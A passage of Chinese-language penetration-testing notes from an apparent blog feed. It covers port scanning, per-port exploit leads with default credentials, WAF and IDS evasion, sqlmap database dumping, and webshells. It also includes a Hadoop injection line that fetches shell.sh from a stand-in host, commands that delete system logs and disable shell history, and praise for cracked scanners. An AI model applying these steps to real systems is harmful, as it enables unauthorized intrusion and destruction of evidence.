class="line">完整信息获取,详细显示，syn探测，高速扫描，系统和服务版本信息，脚本扫描和路由跟踪,外网扫描T2比较合适，T4以上不准确</span><br><span class="line"></span><br><span class="line">扫描前1000号TCP端口</span><br><span class="line">nmap 192.168.100.2</span><br><span class="line"></span><br><span class="line">Ping扫描8个本地主机(按ARP、ICMP、TCP 80的顺序)</span><br><span class="line">nmap –sP 192.168.100.0 -7</span><br><span class="line"></span><br><span class="line">扫描80,443端口</span><br><span class="line">nmap -p 80,443 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描前1000号TCP端口，OS指纹，服务，然后运行一个NSE脚本</span><br><span class="line">sudo nmap -A 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描全部65535个TCP端口，OS指纹，服务，然后运行一个NSE脚本</span><br><span class="line">sudo nmap –A –p- 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描前1000号UDP端口</span><br><span class="line">sudo nmap -sU 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描所有65535个UDP端口</span><br><span class="line">sudo nmap -sU –p- 192.168.100.2</span><br><span class="line"></span><br><span class="line">扫描所有65535个UDP端口，并获取服务、OS指纹，之后运行一些NSE脚本</span><br><span class="line">sudo nmap –sU -p- -A 192.168.100.2</span><br></pre></td></tr></table></figure><p><strong>隐蔽扫描</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sN 10.10.10.129</span><br><span class="line">nmap -sN 10.10.10.129</span><br><span class="line">nmap -sF 10.10.10.129</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;<strong>-sN</strong>&#x3D;&#x3D; 是Null扫描，是通过发送非常规的TCP通信数据包进行探测。<strong>Null扫描不会标记任何数据包，目标主机相应端口关闭，会响应一个RST数据包，端口开启则不会响应任何信息；</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814164843843.png" alt="image-20220814164843843"></p><p>21端口开启，所以-sN扫描未返回任何数据包：</p><p>发送的数据包：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814165335013.png" alt="image-20220814165335013"></p><p>&#x3D;&#x3D;<strong>-sF</strong>&#x3D;&#x3D; 是FIN扫描，当我们使用TCP SYN扫描时可能会被目标主机的防火墙发现，会阻止SYN数据包，这时我们使用TCP FIN扫描方式会有很好的穿透效果。使用FIN扫描不需要完成TCP握手，TCP FIN扫描是<strong>向目标端口发送一个FIN包，收到响应RST包则说明目标端口是开放的，如果没有收到RST则说明是关闭的。</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814165013556.png" alt="image-20220814165013556"></p><p>发送的FIN数据包：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814165444175.png" alt="image-20220814165444175"></p><p>邮件服务端口110开启，所以返回RST数据包：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814165151837.png" alt="image-20220814165151837"></p><p>&#x3D;&#x3D;<strong>-sX</strong>&#x3D;&#x3D; 是Xmas扫描，发送的数据包的FIN、PSH和URG标记位置打开，即标志为1。如果目标主机的FIN、PSH和URG标记位是开放的，则会响应一个RST标志包；</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814165213503.png" alt="image-20220814165213503"></p><p>发送的数据包，FIN、PSH和URG标记位为1：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814165601023.png" alt="image-20220814165601023"></p><p>目标主机的FIN、PSH和URG标记位是开放的。所以返回RST数据包，并且可以发现目标主机的FIN、PSH和URG标记位为0：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220814164728548.png" alt="image-20220814164728548"></p><h4 id="1-2-常见端口漏洞利用"><a href="#1-2-常见端口漏洞利用" class="headerlink" title="1.2 常见端口漏洞利用"></a>1.2 常见端口漏洞利用</h4><p>快速扫描：<br>Masscan -p80,800 ip –rate&#x3D;10000</p><p><strong>21 &#x2F; FTP</strong></p><blockquote><p>匿名&#x2F;暴力破解<br>拒绝服务</p></blockquote><p><strong>22 &#x2F; SSH</strong></p><blockquote><p>暴力破解</p></blockquote><p><strong>23 &#x2F; telnet</strong></p><blockquote><p>Winbox(CVE-2018-14847)<br><a href="https://github.com/BasuCert/WinboxPoC">https://github.com/BasuCert/WinboxPoC</a><br>弱口令 &#x2F; 暴力破解</p></blockquote><p><strong>161 &#x2F; snmp</strong></p><blockquote><p>弱口令<br><a href="https://blog.csdn.net/archersaber39/article/details/78932252">https://blog.csdn.net/archersaber39/article/details/78932252</a></p></blockquote><p><strong>389 &#x2F; ladp</strong></p><blockquote><p>匿名访问<br><a href="https://www.cnblogs.com/persuit/p/5706432.html">https://www.cnblogs.com/persuit/p/5706432.html</a><br>ladp注入<br><a href="http://www.4hou.com/technology/9090.html">http://www.4hou.com/technology/9090.html</a><br><a href="https://www.freebuf.com/articles/web/149059.html">https://www.freebuf.com/articles/web/149059.html</a></p></blockquote><p><strong>443 &#x2F; ssl</strong></p><blockquote><p>openssl心脏出血<br><a href="https://paper.seebug.org/437/">https://paper.seebug.org/437/</a><br><a href="http://www.anquan.us/static/drops/papers-1381.html">http://www.anquan.us/static/drops/papers-1381.html</a><br><a href="https://www.freebuf.com/sectool/33191.html">https://www.freebuf.com/sectool/33191.html</a></p></blockquote><p><strong>445 &#x2F; smb</strong></p><blockquote><p>win10拒绝服务<br>永恒之蓝RCE</p></blockquote><p><strong>875 &#x2F; rsync</strong></p><blockquote><p>匿名访问<br><a href="http://www.anquan.us/static/bugs/wooyun-2016-0190815.html">http://www.anquan.us/static/bugs/wooyun-2016-0190815.html</a><br><a href="https://paper.seebug.org/409/">https://paper.seebug.org/409/</a><br><a href="http://www.91ri.org/11093.html">http://www.91ri.org/11093.html</a></p></blockquote><p><strong>1433 &#x2F; mssql</strong></p><blockquote><p>暴力破解<br><a href="http://www.anquan.us/static/drops/tips-12749">http://www.anquan.us/static/drops/tips-12749</a>.　　html<br><a href="https://www.seebug.org/appdir/Microsoft%20SQL%20Server">https://www.seebug.org/appdir/Microsoft%20SQL%20Server</a></p><p><strong>1521 &#x2F; oracle</strong></p></blockquote><blockquote><p>暴力破解<br><a href="https://www.exploit-db.com/exploits/33084">https://www.exploit-db.com/exploits/33084</a></p></blockquote><p><strong>2601 &#x2F; zebra</strong></p><blockquote><p><a href="http://www.anquan.us/static/bugs/wooyun-2013-047409.html">http://www.anquan.us/static/bugs/wooyun-2013-047409.html</a></p></blockquote><p><strong>3128 &#x2F; squid</strong></p><p><strong>3306 &#x2F; mysql</strong></p><blockquote><p>RCE<br><a href="http://www.91ri.org/17511.html">http://www.91ri.org/17511.html</a><br>CVE-2015-0411<br>hash破解<br><a href="https://www.freebuf.com/column/153561.html">https://www.freebuf.com/column/153561.html</a><br>waf绕过<br><a href="https://www.freebuf.com/articles/web/155570.html">https://www.freebuf.com/articles/web/155570.html</a><br>general_log_file getshell<br><a href="https://www.freebuf.com/column/143125.html">https://www.freebuf.com/column/143125.html</a><br>提权<br><a href="http://www.91ri.org/16540.html">http://www.91ri.org/16540.html</a></p></blockquote><p><strong>3312 &#x2F; kangle</strong></p><blockquote><p>getshell<br><a href="https://www.secpulse.com/archives/23927.html">https://www.secpulse.com/archives/23927.html</a></p></blockquote><p><strong>3389 &#x2F; rdp</strong></p><blockquote><p>shift 放大镜 输入法绕过 guest用户<br>永恒之蓝(ESTEEMAUDIT)<br><a href="https://www.freebuf.com/articles/system/132171.html">https://www.freebuf.com/articles/system/132171.html</a><br><a href="https://www.anquanke.com/post/id/86328">https://www.anquanke.com/post/id/86328</a><br>ms12-020<br><a href="https://blog.csdn.net/meyo_leo/article/details/77950552">https://blog.csdn.net/meyo_leo/article/details/77950552</a></p></blockquote><p><strong>4440 &#x2F; rundeck</strong></p><blockquote><p><a href="https://www.secpulse.com/archives/29500.html">https://www.secpulse.com/archives/29500.html</a></p></blockquote><p><strong>4848 &#x2F; glassfish</strong></p><blockquote><p>文件读取<br><a href="https://www.secpulse.com/archives/42277.html">https://www.secpulse.com/archives/42277.html</a><br><a href="https://www.anquanke.com/post/id/85948">https://www.anquanke.com/post/id/85948</a><br>GlassFish2 &#x2F; admin:admin GlassFish3,4 &#x2F; 如果管理员不设置帐号本地会自动登录,远程访问会提示配置错误</p></blockquote><p><strong>5432 &#x2F; PostgreSQL</strong></p><blockquote><p>RCE<br><a href="https://www.cnblogs.com/KevinGeorge/p/8521496.html">https://www.cnblogs.com/KevinGeorge/p/8521496.html</a><br><a href="https://www.secpulse.com/archives/69153.html">https://www.secpulse.com/archives/69153.html</a><br>默认账号postgres<br>参考<br><a href="http://www.91ri.org/13070.html">http://www.91ri.org/13070.html</a><br><a href="http://www.91ri.org/6507.html">http://www.91ri.org/6507.html</a></p></blockquote><p><strong>5672,15672,4369,25672 &#x2F; RabbitMQ</strong><br>（guest&#x2F;guest）</p><p><strong>5900 &#x2F; VNC</strong></p><blockquote><p><a href="https://www.seebug.org/appdir/RealVNC">https://www.seebug.org/appdir/RealVNC</a></p></blockquote><p><strong>5984 &#x2F; CouchDB</strong></p><blockquote><p><a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a></p></blockquote><p><strong>6082 &#x2F; varnish</strong></p><blockquote><p>CLI 未授权<br><a href="https://www.secpulse.com/archives/10681.html">https://www.secpulse.com/archives/10681.html</a></p></blockquote><p><strong>6379 &#x2F; redis</strong></p><blockquote><p>Redis未授权<br>ssh publickey<br>crontab<br>webshell<br>反序列化<br>开机自启文件夹写bat<br>参考<br><a href="https://www.freebuf.com/column/170710.html">https://www.freebuf.com/column/170710.html</a></p></blockquote><p><strong>7001,7002 &#x2F; WebLogic</strong></p><blockquote><p>默认弱口令<br>weblogic&#x2F;weblogic ,weblogic&#x2F;welcom ,weblogic&#x2F;welcom1,weblogic1&#x2F;weblogic<br>反序列<br>CVE-2018-2628<br><a href="https://www.freebuf.com/articles/web/169770.html">https://www.freebuf.com/articles/web/169770.html</a><br><a href="https://www.seebug.org/appdir/WebLogic">https://www.seebug.org/appdir/WebLogic</a></p></blockquote><p><strong>9200,9300 &#x2F; elasticsearch</strong></p><blockquote><p>CVE-2015-1427<br><a href="http://www.anquan.us/static/drops/papers-5142.html">http://www.anquan.us/static/drops/papers-5142.html</a><br>CVE-2018-17246<br><a href="https://www.seebug.org/vuldb/ssvid-97730">https://www.seebug.org/vuldb/ssvid-97730</a><br>参考<br><a href="https://www.seebug.org/search/?keywords=elasticsearch">https://www.seebug.org/search/?keywords=elasticsearch</a></p></blockquote><p><strong>9000 &#x2F; fcgi</strong></p><blockquote><p><a href="https://paper.seebug.org/289/">https://paper.seebug.org/289/</a></p></blockquote><p><strong>9043 &#x2F; WebSphere</strong></p><blockquote><p>Websphere8.5<br><a href="https://localhost:9043/ibm/console/logon.jsp">https://localhost:9043/ibm/console/logon.jsp</a><br>Websphere6-7<br><a href="http://localhost:9043/ibm/console">http://localhost:9043/ibm/console</a><br>后台未授权，登录后可部署WAR包<br>SOAP服务有反序列化<br>弱口令：admin &#x2F; password</p></blockquote><p><strong>11211 &#x2F; memcache</strong></p><blockquote><p>未授权<br>UDP反射<br><a href="https://shockerli.net/post/memcached-udp-reflection-attack-bug/">https://shockerli.net/post/memcached-udp-reflection-attack-bug/</a></p></blockquote><p><strong>27017,27018 &#x2F; Mongodb</strong></p><blockquote><p>未授权<br>注入<br><a href="https://www.anquanke.com/post/id/83763">https://www.anquanke.com/post/id/83763</a><br>phpMoAdmin RCE<br><a href="https://www.aqniu.com/threat-alert/6978.html">https://www.aqniu.com/threat-alert/6978.html</a></p></blockquote><p><strong>50000 &#x2F; SAP</strong></p><blockquote><p>SAP命令执行<br><a href="https://www.secpulse.com/archives/20204.html">https://www.secpulse.com/archives/20204.html</a></p></blockquote><p><strong>50070,50030 &#x2F; hadoop</strong></p><blockquote><p>未授权<br><a href="https://www.freebuf.com/vuls/173638.html">https://www.freebuf.com/vuls/173638.html</a><br>命令执行<br>host:50060&#x2F;pstack?pid&#x3D;123|wget <a href="http://somehost/shell.sh">http://somehost/shell.sh</a><br><a href="https://www.seebug.org/search/?keywords=hadoop">https://www.seebug.org/search/?keywords=hadoop</a><br>其他<br><a href="http://www.91ri.org/15441.html">http://www.91ri.org/15441.html</a></p></blockquote><h4 id="1-3-WAF-及-bypass"><a href="#1-3-WAF-及-bypass" class="headerlink" title="1.3 WAF 及 bypass"></a>1.3 WAF 及 bypass</h4><p>探测WAF。</p><p><strong>Nmap</strong>探测WAF有两种脚本，一种是<code>http-waf-detect</code>，一种是<code>http-waf-fingerprint</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p port --script=http-waf-detect ip</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>wafw00f</strong>：kaili中的防火墙探测工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wafw00f -a http://example.com 　　</span><br></pre></td></tr></table></figure><p><strong>sqlmap</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap-u “http://www.vxxxx.org/ex.php?id=1” --identify-waf</span><br></pre></td></tr></table></figure><p>bypass：</p><p>（1）请求真实ip绕过waf：部分watf部署架构的特性，部分waf并不是直接串在目标站点线路上，而是通过DNS解析的形式部署，此时可以先探测到目标站点的真实ip直接请求ip以此绕过waf的检测；</p><p>（2）检测内容范围绕过：waf性能限制，检测特定内容前几k或几十K的内容，然后在此特定内容段内填充物用数据， payload放于物用数据后，以此绕过检测；</p><p>（3）协议盲区绕过：waf根据自己的防御策略所支持的协议特性，针对该协议内的请求进行检查，但是存在一些协议检测或协议运行机制上的缺陷导致被绕过，例如协议未覆盖、协议解析不正确、协议解析遗漏等；</p><p>（4）检测规则绕过：waf工程师规则编写经验、规则覆盖面等问题，来绕过检测，例如利用 MySQL对一些特殊字符处理的特性、语法特性绕过。</p><p>（5）文件包含绕过：相对路径、绝对路径。</p><p>绕过技术：</p><ol><li><p>大小写转换</p></li><li><p>URL编码</p></li><li><p>Unicode</p></li><li><p>HTML编码</p></li><li><p>混合编码</p></li><li><p>使用注释</p></li><li><p>双重编码</p></li><li><p>通配符混淆</p></li><li><p>垃圾字符</p></li><li><p>换行</p></li><li><p>未初始化的变量</p></li><li><p>制表符和换行</p></li><li><p>令牌破坏者</p></li><li><p>其他格式的混淆</p></li></ol><h4 id="1-4-目录、后台和敏感路径文件扫描"><a href="#1-4-目录、后台和敏感路径文件扫描" class="headerlink" title="1.4 目录、后台和敏感路径文件扫描"></a>1.4 目录、后台和敏感路径文件扫描</h4><p><strong>御剑</strong> 目录（土司专版，笔记里有）、后台扫描（图片属性地址暴露），</p><p><strong>完善目录和账密字典方法：</strong></p><p>基础字典包合并去重</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dymerge.py -u</span><br><span class="line">python pydictor.py -tool uniqbiner /my/dict/dirpath --output uniq.txt</span><br><span class="line">python pydictor.py -tool uniqifer /tmp/dicts.txt --output /tmp/uniq.txt</span><br></pre></td></tr></table></figure><p>推荐工具：<strong>白鹿社工字典</strong></p><p><a href="https://github.com/HongLuDianXue/BaiLu-SED-Tool/releases">https://github.com/HongLuDianXue/BaiLu-SED-Tool/releases</a></p><p>密码字典实时丰富更新。提取各种泄露数据中的各种类型的密码，然后按出现频率排序，比如键盘组合top100等等，就能得到各种类型的密码字典。</p><p><a href="https://github.com/huyuanzhi2/password_brute_dictionary">https://github.com/huyuanzhi2/password_brute_dictionary</a></p><h3 id="2-人工浏览-逐个请求burp"><a href="#2-人工浏览-逐个请求burp" class="headerlink" title="2. 人工浏览\逐个请求burp"></a>2. 人工浏览\逐个请求burp</h3><p>非常重要,有必要手动去浏览每个页面，点击页面上每一个跳转，这样在Burp的sitemap里面就可以出现这些请求和响应。</p><p>图片后台地址\图片后面的信息<br>跳转参数\奇怪的参数<br>泄露邮箱等社工信息<br>业务逻辑\架构</p><h3 id="3-自动化"><a href="#3-自动化" class="headerlink" title="3.自动化"></a>3.自动化</h3><p>自动化渗透测试框架:(待补充)</p><p>Sn1per</p><p>Ary</p><p>railgun</p><p>自动化信息收集效率较高，从github上多找一找，也可以自己写：</p><p><a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 oneforall.py --target example.com run</span><br><span class="line">python3 oneforall.py --targets ./example.txt run</span><br></pre></td></tr></table></figure><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><h3 id="1-漏洞扫描工具"><a href="#1-漏洞扫描工具" class="headerlink" title="1. 漏洞扫描工具"></a>1. 漏洞扫描工具</h3><p>注意：登录类网站扫描要带cookies扫才能扫到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AWVS网上总有最新破解版</span><br><span class="line"></span><br><span class="line">goby自动化漏扫框架，功能丰富，必备</span><br><span class="line"></span><br><span class="line">Nessus破解流程复杂，但是真的好用</span><br><span class="line"></span><br><span class="line">Netsparker综合型的web应用安全漏洞扫描工具，检查SQL和XSS比较擅长</span><br><span class="line"></span><br><span class="line">Xray也是必备的，渗透开始就挂着，鼠标点到哪里扫到哪里，联动burp和其他漏扫效果也不错</span><br></pre></td></tr></table></figure><h4 id="1-1-Nikto-Web服务漏洞扫描器"><a href="#1-1-Nikto-Web服务漏洞扫描器" class="headerlink" title="1.1 Nikto Web服务漏洞扫描器"></a>1.1 Nikto Web服务漏洞扫描器</h4><p>Tips：利用-Format选项来导出特定格式的扫描结果，使扫描结果更容易阅读和分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -host http://example.com -output ~/nikto.html -Format html</span><br></pre></td></tr></table></figure><p>NIKTO使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1、Nikto -update #升级，更新插件；</span><br><span class="line">2、Nikto -list-plugins #查看插件；</span><br><span class="line">3、Nikto -host http://1.1.1.1 #扫描目标：域名方式；</span><br><span class="line">4、Nikto -host http://1.1.1.1 -output #扫描并输出结果</span><br><span class="line">5、Nikto -host 1.1.1.1 -port 80 #扫描目标：ip地址加端口号</span><br><span class="line">6、Nikto -host http://www.baidu.com -port 443 -ssl #扫描https网站</span><br><span class="line">7、Nikto -host 文件名.txt #批量扫描目标</span><br><span class="line">8、nmap -p80 192.168.1.0/24 -oG - | nikto -host -</span><br><span class="line">#利用nmap扫描开放80端口的IP段并且oG（nmap结果输出并整理）通过管道的方式“|”用nikto进行扫描</span><br><span class="line">9、nikto -host 192.168.0.1 -useproxy http://localhost:8070</span><br><span class="line">#利用代理进行扫描</span><br><span class="line">10、-vhost</span><br><span class="line">#当一个网站存在多个端口时可以使用-vhost 遍历所有网站进行扫描或一个ip对应多个网站</span><br><span class="line">11、Nikto交互形参数</span><br></pre></td></tr></table></figure><p><strong>配置文件</strong>：</p><p>路径：&#x2F;etc&#x2F;nikto.conf<br>User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本；<br>在nikto中最好修改成别的浏览器user agent；<br>设置cookie：<br>在配置文件中找到cookie进行设置（#STATIC-COOKIE&#x3D; “cookie1”&#x3D;”cookie value”;”cookie2”&#x3D;”cookie val”）</p><p><strong>IDS逃避技术</strong>：</p><p>主要为了躲避IDS、IPS检测告警-evasion #此参数使用方式（Nikto -host <a href="http://1.1.1.1/">http://1.1.1.1</a> -evasion 1234）<br>逃避方式共8种：<br>1、随机url编码，2、自选路径，3、过早结束的URL<br>4、优先考虑长随机字符串5、参数欺骗<br>6、使用TAB作为命令的分隔符，7、使用变化的URL<br>8、使用Windows路径分隔符</p><h4 id="1-2-AWVS漏扫"><a href="#1-2-AWVS漏扫" class="headerlink" title="1.2 AWVS漏扫"></a>1.2 AWVS漏扫</h4><p>这个没什么好说的，破解版到处都是。</p><h4 id="1-3-NESSUS"><a href="#1-3-NESSUS" class="headerlink" title="1.3 NESSUS"></a>1.3 NESSUS</h4><p>实时更新插件的漏扫，很好用，就是激活流程麻烦。<br><a href="https://www.wuyini.cn/765.html">https://www.wuyini.cn/765.html</a></p><h4 id="1-4-Xray自动化的漏洞挖掘"><a href="#1-4-Xray自动化的漏洞挖掘" class="headerlink" title="1.4 Xray自动化的漏洞挖掘"></a>1.4 Xray自动化的漏洞挖掘</h4><p>burp+xray：<br>BurpSuite + Xray 被动扫描配置 - Ritte - 博客园<br>或者直接挂浏览器，点到哪里，扫到哪里<br>xray+各种漏扫联动</p><h4 id="1-5-Fuzz"><a href="#1-5-Fuzz" class="headerlink" title="1.5 Fuzz"></a>1.5 Fuzz</h4><p>Fuzz可以发现应用程序中没有被引用但是确实是可以访问的页面。<br>Discover Content是Burp中专门用于此目的的工具。<br>Burp Intruder也可以通过字典攻击来实施强制浏览(通常是在url参数和文件路径部分进行修改)，爆破、注入等。<br>FuzzDB包含一些用于此目的的非常牛逼的字典。</p><h3 id="2-挖掘漏洞"><a href="#2-挖掘漏洞" class="headerlink" title="2.挖掘漏洞"></a>2.挖掘漏洞</h3><h4 id="2-1-SQL注入"><a href="#2-1-SQL注入" class="headerlink" title="2.1 SQL注入"></a>2.1 SQL注入</h4><p>初步测试：见框就上，加 and 1&#x3D;1、and 1&#x3D;2、and 2&#x3D;1 or </p><p>抓包爆破常用SQL注入payload字典，上burp intruder。</p><p>注入六连：</p><ol><li><p>sqlmap -u “<a href="http://www.xx.com/?id=x&quot;">http://www.xx.com?id=x&quot;</a> 查询是否存在注入点</p></li><li><p>–dbs 检测站点包含哪些数据库</p></li><li><p>–current-db 获取当前的数据库名</p></li><li><p>–tables -D “db_name” 获取指定数据库中的表名 -D后接指定的数据库名称</p></li><li><p>–columns -T “table_name” -D “db_name” 获取数据库表中的字段</p></li><li><p>–dump -C “columns_name” -T “table_name” -D “db_name” 获取字段的数据内容</p></li></ol><ul><li><strong>cookie注入</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.xx.com/xxx.asp&quot; --cookie &quot;id=XXX cookie&quot; --level 2</span><br></pre></td></tr></table></figure><ul><li><p><strong>post注入</strong></p><p>步骤如下：</p><ol><li><p>打开burpsuite获取拦截信息（post），然后右键保存文件（post.txt）到指定目录下。</p></li><li><p>运行sqlmap并执行如下命令加载文件：</p><p><code>sqlmap -r post.txt -p &quot;username&quot;</code></p><p>-p指定参数（即拦截的post请求中表单提交的用户名或密码等name参数）</p><p>自动获取表单：–forms自动获取表单</p><p>例如：<code>sqlmap -u http://www.xx.com/login.asp --forms</code></p><p>指定参数搜索：–data</p><p>例如：<code>sqlmap -u http://www.xx.com/login.asp --data &quot;username=1&quot;</code></p></li></ol></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">--purge  【重新扫描（--purge 删除原先对该目标扫描的记录】</span><br><span class="line">--tables 【获取表名】</span><br><span class="line">--dbs    【检测站点包含哪些数据库】</span><br><span class="line">--current-db   【获取当前的数据库名】</span><br><span class="line">--current-user 【检测当前用户】</span><br><span class="line">--is-dba 【判断站点的当前用户是否为数据库管理员】</span><br><span class="line">--batch  【默认确认，不询问你是否输入】</span><br><span class="line">--search 【后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D）】</span><br><span class="line">--threads 10 【线程，sqlmap线程最高设置为10】</span><br><span class="line">--level 3   【sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高为5】</span><br><span class="line">--risk 3 【执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全】</span><br><span class="line">-v 【详细的等级(0-6)</span><br><span class="line">0：只显示Python的回溯，错误和关键消息。</span><br><span class="line">1：显示信息和警告消息。</span><br><span class="line">2：显示调试消息。</span><br><span class="line">3：有效载荷注入。</span><br><span class="line">4：显示HTTP请求。</span><br><span class="line">5：显示HTTP响应头。</span><br><span class="line">6：显示HTTP响应页面的内容】</span><br><span class="line"></span><br><span class="line">--privileges 【查看权限】</span><br><span class="line">--tamper xx.py,cc.py 【防火墙绕过，后接tamper库中的py文件】</span><br><span class="line">--method &quot;POST&quot; --data &quot;page=1&amp;id=2&quot; 【POST方式提交数据】</span><br><span class="line">--threads number　　【采用多线程 后接线程数】</span><br><span class="line">--referer &quot;&quot; 【使用referer欺骗】</span><br><span class="line">--user-agent &quot;&quot; 【自定义user-agent】</span><br><span class="line">--proxy “目标地址″ 【使用代理注入】</span><br></pre></td></tr></table></figure><h4 id="2-2-XSS"><a href="#2-2-XSS" class="headerlink" title="2.2 XSS"></a>2.2 XSS</h4><p>xss漏洞原理分析与挖掘方法 - 知乎</p><p>XSS小结 - 先知社区</p><p>2020跨站点脚本[xss]速查表|雨苁</p><p>XSSer自动化工具</p><p>XSStrike 自动化绕过WAF</p><p>XSS生成：<a href="http://xssor.io/">http://xssor.io</a></p><h2 id="漏洞利用getshgell"><a href="#漏洞利用getshgell" class="headerlink" title="漏洞利用getshgell"></a>漏洞利用getshgell</h2><p>常用的漏洞利用工具如下：</p><p>SQL注入 ——&gt; Sqlmap</p><p>XSS跨站脚本——&gt; Beef-XSS</p><p>抓包改包工具——&gt; Burpsuite工具 、 Fidder抓包软件</p><p>文件上传漏洞，上传漏洞的话，我们一般会上传一句话木马上去，进而再获得webshell，传送门——&gt; Webshell和一句话木马</p><p>但是，获得了webshell后，一般权限很低，所以我们需要提权，</p><p>可以选择反弹一个MSF类型的shell提权：Metasploit Framework(MSF)的使用 、 Msfvenonm生成一个后门木马。</p><p>也可以反弹一个CobaltStrike类型的shell：渗透测试神器Cobalt Strike的使用。</p><p>也可以MSF和CobaltStrike联动：MSF和CobaltStrike联动 也可以使用其他提权：Windows提权 、 Linux提权。</p><h2 id="后渗透（权限提升）"><a href="#后渗透（权限提升）" class="headerlink" title="后渗透（权限提升）"></a>后渗透（权限提升）</h2><p>见权限提升的文章</p><h2 id="清除痕迹"><a href="#清除痕迹" class="headerlink" title="清除痕迹"></a>清除痕迹</h2><p>Windows系统</p><p>1：如果是windows系统，可用MSF中的 clearev 命令清除痕迹</p><p>2：如果3389远程登录过，需要清除mstsc痕迹</p><p>3：执行命令清除日志：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">del %WINDR%\* .log /a/s/q/f</span><br></pre></td></tr></table></figure><p>4：如果是web应用，找到web日志文件，删除</p><p>Linux系统</p><p>1：如果是Linux系统，在获取权限后，执行以下命令，不会记录输入过的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export HISTFILE=/dev/null export HISTSIZE=0</span><br></pre></td></tr></table></figure><p>2：删除 &#x2F;var&#x2F;log 目录下的日志文件</p><p>3：如果是web应用，找到web日志文件，删除</p><h2 id="撰写报告"><a href="#撰写报告" class="headerlink" title="撰写报告"></a>撰写报告</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;渗透测试全流程&quot;&gt;&lt;a href=&quot;#渗透测试全流程&quot; class=&quot;headerlink&quot; title=&quot;渗透测试全流程&quot;&gt;&lt;/a&gt;渗透测试全流程&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articl</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>基础概念与信息收集</title>
    <link href="https://frankcao3.github.io/posts/39395"/>
    <id>https://frankcao3.github.io/posts/39395</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.973Z</updated>
    
